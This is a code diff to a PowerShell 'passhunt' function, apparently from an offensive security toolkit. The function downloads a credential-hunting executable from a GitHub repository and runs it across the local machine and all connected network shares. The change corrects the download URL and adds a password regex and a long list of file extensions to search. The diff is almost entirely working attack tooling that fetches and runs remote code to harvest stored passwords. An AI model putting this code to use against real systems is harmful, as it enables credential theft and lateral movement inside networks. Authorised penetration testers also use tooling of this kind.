@@ -1103,16 +1103,20 @@ function passhunt
             {
                 foreach ($line in $testShares)
                 {
-                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 }
             }
             else
             {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-                Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+                Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
                 foreach ($line in $shares)
                 {
-                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
                                     
             }
@@ -1120,7 +1124,7 @@ function passhunt
         if ($local)
         {
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
             $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
@@ -1130,7 +1134,9 @@ function passhunt
                 $shares = get-content .\passhuntshares.txt | select-object -skip 4    
                 foreach ($line in $shares)
                 {
-                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
+                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
                                   
             }
@@ -1138,8 +1144,10 @@ function passhunt
         else
         {
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
-            cmd /c start powershell -Command "$currentPath\passhunt.exe"
+            Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            cmd /c start powershell -Command "$currentPath\passhunt.exe -r '(password|passwort|passwd| -p | -p=| -pw |
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
         }
 
 }
